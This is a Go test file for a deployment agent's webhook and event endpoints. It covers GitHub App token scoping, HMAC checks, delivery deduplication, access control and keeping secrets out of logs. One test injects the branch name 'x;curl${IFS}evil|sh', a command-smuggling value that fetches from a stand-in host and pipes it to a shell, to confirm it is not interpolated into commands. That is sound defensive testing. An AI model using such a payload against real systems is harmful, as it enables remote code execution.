package api

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/flatrun/agent/internal/auth"
	"github.com/flatrun/agent/internal/runs"
	"github.com/flatrun/agent/internal/runtimes"
	"github.com/flatrun/agent/internal/webhook"
	"github.com/flatrun/agent/pkg/config"
	"github.com/gin-gonic/gin"
	"github.com/golang-jwt/jwt/v5"
)

type eventRuntime struct{ specs chan runtimes.Spec }

func (r *eventRuntime) Type() runtimes.Type             { return runtimes.TypeFirecracker }
func (r *eventRuntime) Available(context.Context) error { return nil }
func (r *eventRuntime) Create(_ context.Context, spec runtimes.Spec) (runtimes.Instance, error) {
	env := map[string]string{}
	for k, v := range spec.Env {
		env[k] = v
	}
	spec.Env = env
	r.specs <- spec
	return eventInstance{}, nil
}

type eventInstance struct{}

func (eventInstance) ID() string                                  { return "event-test" }
func (eventInstance) Start(context.Context) error                 { return nil }
func (eventInstance) Wait(context.Context) (runtimes.Exit, error) { return runtimes.Exit{}, nil }
func (eventInstance) Logs(context.Context, bool) (io.ReadCloser, error) {
	return io.NopCloser(strings.NewReader("config abc123\n")), nil
}
func (eventInstance) CopyOut(context.Context, string) (io.ReadCloser, error) {
	return nil, fmt.Errorf("no artifacts")
}
func (eventInstance) Stop(context.Context, time.Duration) error { return nil }
func (eventInstance) Destroy(context.Context) error             { return nil }

func TestEventHTTPRunner(t *testing.T) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	keyPath := filepath.Join(t.TempDir(), "key.pem")
	if err := os.WriteFile(keyPath, pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)}), 0600); err != nil {
		t.Fatal(err)
	}
	release := make(chan struct{})
	started := make(chan struct{}, 1)
	var apiCalls atomic.Int32
	github := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		apiCalls.Add(1)
		if r.URL.Path == "/app/installations/3456996/access_tokens" {
			started <- struct{}{}
			<-release
		}
		if r.Method != "POST" || r.Header.Get("Accept") != "application/vnd.github+json" {
			t.Error("invalid API request")
		}
		switch r.URL.Path {
		case "/app/installations/3456996/access_tokens":
			token, err := jwt.Parse(strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer "), func(token *jwt.Token) (any, error) { return &key.PublicKey, nil }, jwt.WithValidMethods([]string{"RS256"}), jwt.WithIssuer("42"), jwt.WithExpirationRequired())
			if err != nil || !token.Valid {
				t.Errorf("invalid app JWT: %v", err)
			}
			var body struct {
				Repositories []string `json:"repositories"`
			}
			_ = json.NewDecoder(r.Body).Decode(&body)
			if !reflect.DeepEqual(body.Repositories, []string{"Hello-World"}) {
				t.Error("installation token must be repository scoped")
			}
			w.WriteHeader(201)
			_, _ = io.WriteString(w, `{"token":"ghs_16C7e42F292c6912E7710c838347Ae178B4a","expires_at":"2016-07-11T22:14:10Z","permissions":{"issues":"write","contents":"read"},"repository_selection":"selected"}`)
		case "/repos/Codertocat/Hello-World/actions/runners/generate-jitconfig":
			if r.Header.Get("Authorization") != "Bearer ghs_16C7e42F292c6912E7710c838347Ae178B4a" {
				t.Error("missing installation token")
			}
			var body struct {
				Name   string   `json:"name"`
				Group  int      `json:"runner_group_id"`
				Labels []string `json:"labels"`
				Work   string   `json:"work_folder"`
			}
			_ = json.NewDecoder(r.Body).Decode(&body)
			if !strings.HasPrefix(body.Name, "flatrun-") || body.Group != 1 || body.Work != "_work" || !reflect.DeepEqual(body.Labels, []string{"ubuntu-latest"}) {
				t.Errorf("JIT request: %+v", body)
			}
			w.WriteHeader(201)
			_, _ = io.WriteString(w, `{"runner":{"id":23,"name":"New runner","os":"unknown","status":"offline","busy":false},"encoded_jit_config":"abc123"}`)
		default:
			t.Errorf("unexpected path %s", r.URL.Path)
			w.WriteHeader(404)
		}
	}))
	defer github.Close()
	defer func() {
		select {
		case <-release:
		default:
			close(release)
		}
	}()
	root := t.TempDir()
	rt := &eventRuntime{specs: make(chan runtimes.Spec, 5)}
	manager, err := runs.NewManager(root, rt, 1)
	if err != nil {
		t.Fatal(err)
	}
	defer manager.Close()
	cfg := &config.Config{Events: config.EventsConfig{Endpoints: []config.EventEndpoint{{Name: "ci", Provider: "github", Secret: "test-secret"}}, Subscriptions: []config.EventSubscription{{Name: "runner", Source: "github/ci", Type: "github.workflow_job.queued", Labels: []string{"ubuntu-latest"}, Action: "run", GitHubRunner: true, Run: config.EventRunSpec{TimeoutSeconds: 120}}}}}
	cfg.Events.SetDefaults()
	s := &Server{config: cfg, webhooks: webhook.DefaultRegistry(), runsManager: manager, githubApp: &webhook.GitHubApp{AppID: 42, PrivateKeyFile: keyPath, BaseURL: github.URL}}
	router := gin.New()
	router.POST("/api/event-hooks/:endpoint", s.receiveEvent)
	var logs bytes.Buffer
	previous := log.Writer()
	log.SetOutput(&logs)
	defer log.SetOutput(previous)
	deliver := func(id, fixture, secret string) int {
		payload, err := os.ReadFile("../webhook/testdata/" + fixture)
		if err != nil {
			t.Fatal(err)
		}
		req := httptest.NewRequest("POST", "/api/event-hooks/ci", bytes.NewReader(payload))
		req.Header.Set("X-GitHub-Event", "workflow_job")
		req.Header.Set("X-GitHub-Delivery", id)
		if secret != "" {
			mac := hmac.New(sha256.New, []byte(secret))
			mac.Write(payload)
			req.Header.Set("X-Hub-Signature-256", "sha256="+hex.EncodeToString(mac.Sum(nil)))
		}
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
		return w.Code
	}
	for _, secret := range []string{"", "wrong"} {
		if status := deliver("bad", "queued.payload.json", secret); status != 404 {
			t.Fatalf("unsigned delivery: %d", status)
		}
	}
	if status := deliver("one", "queued.payload.json", "test-secret"); status != 202 {
		t.Fatalf("queued: %d", status)
	}
	select {
	case <-started:
	case <-time.After(5 * time.Second):
		close(release)
		t.Fatal("GitHub API was not called")
	}
	if status := deliver("one", "queued.payload.json", "test-secret"); status != 200 {
		t.Fatalf("processing duplicate: %d", status)
	}
	close(release)
	s.deliveries.wg.Wait()
	select {
	case spec := <-rt.specs:
		if spec.Image != "ghcr.io/actions/actions-runner" || spec.WorkDir != "/home/runner" || !spec.Network.Egress || spec.Env["JIT"] != "abc123" || spec.Env["RUNNER_ALLOW_RUNASROOT"] != "1" || !reflect.DeepEqual(spec.Command, []string{"sh", "-c", `exec ./run.sh --jitconfig "$JIT"`}) {
			t.Fatalf("runner spec: %+v", spec)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("no run")
	}
	if status := deliver("one", "queued.payload.json", "test-secret"); status != 200 {
		t.Fatalf("duplicate: %d", status)
	}
	for _, fixture := range []string{"in_progress.payload.json", "completed.success.with-organization.payload.json"} {
		if status := deliver(fixture, fixture, "test-secret"); status != 202 {
			t.Fatalf("ignored: %d", status)
		}
	}
	s.deliveries.wg.Wait()
	if status := deliver("in_progress.payload.json", "in_progress.payload.json", "test-secret"); status != 200 {
		t.Fatalf("ignored duplicate: %d", status)
	}
	if apiCalls.Load() != 2 {
		t.Fatalf("API calls: %d", apiCalls.Load())
	}
	deadline := time.Now().Add(5 * time.Second)
	var records []runs.Run
	for {
		records, err = manager.Store.List(nil, 10)
		if err != nil {
			t.Fatal(err)
		}
		if len(records) == 1 && records[0].Status.Finished() {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("runs: %+v", records)
		}
		time.Sleep(10 * time.Millisecond)
	}
	if records[0].Runtime != runtimes.TypeFirecracker || records[0].Spec.TimeoutSeconds != 120 {
		t.Fatal("run runtime or timeout changed")
	}
	raw, _ := json.Marshal(records)
	deliveryLog, _ := json.Marshal(s.deliveries.records)
	output, err := os.ReadFile(manager.LogPath(records[0].ID))
	if err != nil {
		t.Fatal(err)
	}
	for _, content := range [][]byte{raw, deliveryLog, output, logs.Bytes()} {
		if bytes.Contains(content, []byte("abc123")) || bytes.Contains(content, []byte("ghs_16C7")) {
			t.Fatal("secret persisted or logged")
		}
	}
	select {
	case <-rt.specs:
		t.Fatal("extra run")
	default:
	}
}

func TestEventReadHTTPAuthorization(t *testing.T) {
	s, client := setupWorkspaceTestServer(t)
	s.config.Events.Subscriptions = []config.EventSubscription{{Name: "private", Action: "run", Run: config.EventRunSpec{Command: []string{"private-command"}, Env: map[string]string{"PRIVATE": "private-value"}}}}
	s.config.Events.Endpoints = []config.EventEndpoint{{Name: "private-endpoint", Secret: "endpoint-secret"}}
	s.config.Events.GitHubApp.PrivateKeyFile = "/private/app-key.pem"
	admin := client.login("admin", "admin-pass")
	for _, path := range []string{"/config/events", "/config/events.subscriptions"} {
		status, _ := admin.do("PUT", path, "", map[string]any{"value": nil})
		if status != 400 {
			t.Fatalf("events config mutable: %d", status)
		}
	}
	for _, path := range []string{"/events/subscriptions", "/events/deliveries"} {
		status, _ := client.do("GET", path, "", nil)
		if status != 401 {
			t.Fatalf("anonymous: %d", status)
		}
		status, _ = admin.do("GET", path, "", nil)
		if status != 200 {
			t.Fatalf("admin: %d", status)
		}
	}
	status, body := admin.do("POST", "/users", "", map[string]any{"username": "event-viewer", "email": "event@example.com", "password": "test-password", "role": auth.RoleViewer})
	if status != 201 {
		t.Fatalf("create viewer: %d %v", status, body)
	}
	viewer := client.login("event-viewer", "test-password")
	for _, path := range []string{"/events/subscriptions", "/events/deliveries"} {
		status, _ := viewer.do("GET", path, "", nil)
		if status != 403 {
			t.Fatalf("viewer: %d", status)
		}
	}
	status, body = admin.do("POST", "/apikeys", "", map[string]any{"name": "scoped events", "role": auth.RoleAdmin, "deployments": map[string]string{"hello": "read"}})
	if status != 201 {
		t.Fatalf("create scoped key: %d %v", status, body)
	}
	scoped := client
	scoped.token = body["api_key"].(map[string]any)["key"].(string)
	for _, path := range []string{"/events/subscriptions", "/events/deliveries"} {
		status, _ := scoped.do("GET", path, "", nil)
		if status != 403 {
			t.Fatalf("scoped admin key: %d", status)
		}
	}
	for _, global := range []bool{false, true} {
		reader := scoped
		if global {
			reader = admin
		}
		for _, path := range []string{"/config", "/config/events.subscriptions", "/config/events.endpoints", "/config/events.github_app.private_key_file"} {
			status, body := reader.do("GET", path, "", nil)
			if !global && path != "/config" {
				if status != 403 {
					t.Fatalf("scoped config read %s: %d %v", path, status, body)
				}
				continue
			}
			if status != 200 {
				t.Fatalf("config read %s: %d %v", path, status, body)
			}
			raw, err := json.Marshal(body)
			if err != nil {
				t.Fatal(err)
			}
			for _, secret := range []string{"endpoint-secret", "/private/app-key.pem"} {
				if bytes.Contains(raw, []byte(secret)) {
					t.Fatalf("config exposed %s", secret)
				}
			}
			if !global {
				var listing struct {
					Config []config.Entry `json:"config"`
				}
				if err := json.Unmarshal(raw, &listing); err != nil {
					t.Fatal(err)
				}
				for _, entry := range listing.Config {
					if strings.HasPrefix(entry.Key, "events.") {
						t.Fatalf("scoped listing exposed %s", entry.Key)
					}
				}
				if bytes.Contains(raw, []byte("private-command")) || bytes.Contains(raw, []byte("private-value")) {
					t.Fatal("scoped listing exposed subscription")
				}
			} else if path == "/config" || path == "/config/events.subscriptions" {
				if !bytes.Contains(raw, []byte("private-command")) || !bytes.Contains(raw, []byte("private-value")) {
					t.Fatalf("global config missing subscriptions: %s", raw)
				}
			}
		}
	}

}

func TestEventHTTPEnvironmentAndRetention(t *testing.T) {
	rt := &eventRuntime{specs: make(chan runtimes.Spec, 5)}
	manager, err := runs.NewManager(t.TempDir(), rt, 1)
	if err != nil {
		t.Fatal(err)
	}
	defer manager.Close()
	cfg := &config.Config{Events: config.EventsConfig{DeliveryLimit: 2, Endpoints: []config.EventEndpoint{{Name: "deploys", Provider: "github", Secret: "secret"}}, Subscriptions: []config.EventSubscription{{Name: "run", Type: "github.push", Action: "run", Run: config.EventRunSpec{Runtime: "firecracker", Image: "example/{{branch}}", Command: []string{"sh", "-c", "echo {{branch}}"}, WorkDir: "/{{branch}}", ArtifactPaths: []string{"/{{branch}}"}, Env: map[string]string{"REVISION": "{{revision}}"}}}}}}
	cfg.Events.SetDefaults()
	s := &Server{config: cfg, webhooks: webhook.DefaultRegistry(), runsManager: manager}
	router := gin.New()
	router.POST("/api/event-hooks/:endpoint", s.receiveEvent)
	body, err := os.ReadFile("../webhook/testdata/github-push.json")
	if err != nil {
		t.Fatal(err)
	}
	branch := "x;curl${IFS}evil|sh"
	body = bytes.ReplaceAll(body, []byte("refs/heads/master"), []byte("refs/heads/"+branch))
	for _, id := range []string{"a", "a", "b", "c"} {
		mac := hmac.New(sha256.New, []byte("secret"))
		mac.Write(body)
		req := httptest.NewRequest("POST", "/api/event-hooks/deploys", bytes.NewReader(body))
		req.Header.Set("X-GitHub-Event", "push")
		req.Header.Set("X-GitHub-Delivery", id)
		req.Header.Set("X-Hub-Signature-256", "sha256="+hex.EncodeToString(mac.Sum(nil)))
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
		if w.Code != 202 && !(id == "a" && w.Code == 200) {
			t.Fatalf("delivery: %d", w.Code)
		}
		s.deliveries.wg.Wait()
	}
	if len(s.deliveries.records) != 2 || s.deliveries.records[0].ID != "b" || s.deliveries.records[1].ID != "c" {
		t.Fatal("delivery retention exceeded")
	}
	for range 3 {
		select {
		case spec := <-rt.specs:
			if !reflect.DeepEqual(spec.Command, []string{"sh", "-c", "echo {{branch}}"}) || spec.Env["REVISION"] != "{{revision}}" || spec.Env["FLATRUN_EVENT_BRANCH"] != branch || spec.Env["FLATRUN_EVENT_REVISION"] != "6113728f27ae82c7b1a177c8d03f9e96e0adf246" || spec.WorkDir != "/{{branch}}" || spec.Image != "example/{{branch}}" || spec.Env["FLATRUN_EVENT_TYPE"] != "github.push" || spec.Env["FLATRUN_EVENT_JOB_ID"] != "" || spec.Env["FLATRUN_EVENT_SUBJECT"] == "" || len(spec.Env) != 6 {
				t.Fatalf("event config or environment changed: %+v", spec)
			}
		case <-time.After(5 * time.Second):
			t.Fatal("no run")
		}
	}
	select {
	case <-rt.specs:
		t.Fatal("duplicate run")
	default:
	}
}

func TestEventLegacyDeliveryID(t *testing.T) {
	runner := &fakeRunner{optsCh: make(chan actionOptions, 2)}
	s, router, secret := newWebhookTestServer(t, runner, true)
	body, err := os.ReadFile("../webhook/testdata/github-push.json")
	if err != nil {
		t.Fatal(err)
	}
	for i, want := range []int{http.StatusAccepted, http.StatusOK} {
		mac := hmac.New(sha256.New, []byte(secret))
		mac.Write(body)
		req := httptest.NewRequest("POST", "/api/hooks/github/hello", bytes.NewReader(body))
		req.Header.Set("X-GitHub-Event", "push")
		req.Header.Set("X-GitHub-Delivery", "legacy-delivery")
		req.Header.Set("X-Hub-Signature-256", "sha256="+hex.EncodeToString(mac.Sum(nil)))
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
		if w.Code != want {
			t.Fatalf("delivery %d: %d %s", i, w.Code, w.Body.String())
		}
	}
	select {
	case <-runner.optsCh:
	case <-time.After(5 * time.Second):
		t.Fatal("no deploy")
	}
	if len(s.deliveries.records) != 1 || s.deliveries.records[0].Outcome != "succeeded" {
		t.Fatal("legacy delivery not recorded")
	}
}

type eventDockerRuntime struct{ *eventRuntime }

func (*eventDockerRuntime) Type() runtimes.Type { return runtimes.TypeDocker }

func TestEventHTTPUnavailableRunnerAndRedelivery(t *testing.T) {
	rt := &eventDockerRuntime{&eventRuntime{specs: make(chan runtimes.Spec, 2)}}
	manager, err := runs.NewManager(t.TempDir(), rt, 1)
	if err != nil {
		t.Fatal(err)
	}
	defer manager.Close()
	cfg := &config.Config{Events: config.EventsConfig{
		Endpoints:     []config.EventEndpoint{{Name: "ci", Provider: "github", Secret: "test-secret"}},
		Subscriptions: []config.EventSubscription{{Name: "runner", Type: "github.workflow_job.queued", Labels: []string{"ubuntu-latest"}, Action: "run", GitHubRunner: true}},
	}}
	cfg.Events.SetDefaults()
	s := &Server{config: cfg, webhooks: webhook.DefaultRegistry(), runsManager: manager}
	router := gin.New()
	router.POST("/api/event-hooks/:endpoint", s.receiveEvent)
	payload, err := os.ReadFile("../webhook/testdata/queued.payload.json")
	if err != nil {
		t.Fatal(err)
	}
	deliver := func(want int, status string) {
		t.Helper()
		req := httptest.NewRequest("POST", "/api/event-hooks/ci", bytes.NewReader(payload))
		req.Header.Set("X-GitHub-Event", "workflow_job")
		req.Header.Set("X-GitHub-Delivery", "retry")
		mac := hmac.New(sha256.New, []byte("test-secret"))
		mac.Write(payload)
		req.Header.Set("X-Hub-Signature-256", "sha256="+hex.EncodeToString(mac.Sum(nil)))
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
		if w.Code != want || !strings.Contains(w.Body.String(), status) {
			t.Fatalf("delivery: %d %s", w.Code, w.Body.String())
		}
		s.deliveries.wg.Wait()
	}
	var logs bytes.Buffer
	previous := log.Writer()
	log.SetOutput(&logs)
	defer log.SetOutput(previous)
	deliver(202, "accepted")
	if len(s.deliveries.records) != 1 || s.deliveries.records[0].Outcome != "failed" {
		t.Fatalf("delivery not failed: %+v", s.deliveries.records)
	}
	if !strings.Contains(logs.String(), "delivery failed: runtime firecracker unavailable") {
		t.Fatalf("missing runtime failure log: %s", logs.String())
	}
	records, err := manager.Store.List(nil, 10)
	if err != nil || len(records) != 0 {
		t.Fatalf("unavailable runtime created a run: %+v %v", records, err)
	}
	first := s.deliveries.records[0]
	deliver(202, "accepted")
	if len(s.deliveries.records) != 1 || s.deliveries.records[0] == first || s.deliveries.records[0].Outcome != "failed" {
		t.Fatal("failed attempt was not replaced")
	}
	cfg.Events.Subscriptions[0].GitHubRunner = false
	cfg.Events.Subscriptions[0].Run.Runtime = "docker"
	cfg.Events.Subscriptions[0].Run.Command = []string{"echo", "ok"}
	deliver(202, "accepted")
	if s.deliveries.records[0].Outcome != "succeeded" {
		t.Fatal("redelivery did not recover")
	}
	deliver(200, "duplicate")
	select {
	case <-rt.specs:
	case <-time.After(5 * time.Second):
		t.Fatal("no recovered run")
	}
	select {
	case <-rt.specs:
		t.Fatal("duplicate created an extra run")
	default:
	}
}

func TestEventHTTPPartialFailureRedelivery(t *testing.T) {
	s, client := setupWorkspaceTestServer(t)
	rt := &eventRuntime{specs: make(chan runtimes.Spec, 4)}
	manager, err := runs.NewManager(t.TempDir(), rt, 1)
	if err != nil {
		t.Fatal(err)
	}
	defer manager.Close()
	s.runsManager = manager
	s.webhooks = webhook.DefaultRegistry()
	s.config.Events = config.EventsConfig{
		Endpoints: []config.EventEndpoint{{Name: "retry", Provider: "github", Secret: "test-secret"}},
		Subscriptions: []config.EventSubscription{
			{Name: "first", Type: "github.push", Action: "run", Run: config.EventRunSpec{Runtime: "firecracker", Image: "first", Command: []string{"echo", "ok"}}},
			{Name: "second", Type: "github.push", Action: "run", Run: config.EventRunSpec{Runtime: "docker", Image: "second", Command: []string{"echo", "ok"}}},
		},
	}
	payload, err := os.ReadFile("../webhook/testdata/github-push.json")
	if err != nil {
		t.Fatal(err)
	}
	deliver := func() {
		t.Helper()
		req, err := http.NewRequest("POST", client.url+"/api/event-hooks/retry", bytes.NewReader(payload))
		if err != nil {
			t.Fatal(err)
		}
		req.Header.Set("X-GitHub-Event", "push")
		req.Header.Set("X-GitHub-Delivery", "partial")
		mac := hmac.New(sha256.New, []byte("test-secret"))
		mac.Write(payload)
		req.Header.Set("X-Hub-Signature-256", "sha256="+hex.EncodeToString(mac.Sum(nil)))
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != 202 {
			t.Fatalf("delivery: %d", resp.StatusCode)
		}
		s.deliveries.wg.Wait()
	}
	admin := client.login("admin", "admin-pass")
	check := func(outcome, second string) {
		t.Helper()
		status, body := admin.do("GET", "/events/deliveries", "", nil)
		if status != 200 {
			t.Fatalf("delivery log: %d %v", status, body)
		}
		raw, err := json.Marshal(body)
		if err != nil {
			t.Fatal(err)
		}
		var listing struct {
			Deliveries []deliveryRecord `json:"deliveries"`
		}
		if err := json.Unmarshal(raw, &listing); err != nil {
			t.Fatal(err)
		}
		if len(listing.Deliveries) != 1 {
			t.Fatalf("deliveries: %s", raw)
		}
		record := listing.Deliveries[0]
		if record.Outcome != outcome || record.Subscriptions["first"] != "succeeded" || record.Subscriptions["second"] != second {
			t.Fatalf("outcomes: %s", raw)
		}
	}
	deliver()
	check("failed", "failed")
	s.config.Events.Subscriptions[1].Run.Runtime = "firecracker"
	deliver()
	check("succeeded", "succeeded")
	status, body := admin.do("GET", "/runs", "", nil)
	if status != 200 {
		t.Fatalf("runs: %d %v", status, body)
	}
	raw, err := json.Marshal(body)
	if err != nil {
		t.Fatal(err)
	}
	var listing struct {
		Runs []runs.Run `json:"items"`
	}
	if err := json.Unmarshal(raw, &listing); err != nil {
		t.Fatal(err)
	}
	counts := map[string]int{}
	for _, run := range listing.Runs {
		counts[run.Spec.Image]++
	}
	if len(listing.Runs) != 2 || counts["first"] != 1 || counts["second"] != 1 {
		t.Fatalf("runs after redelivery: %s", raw)
	}
}
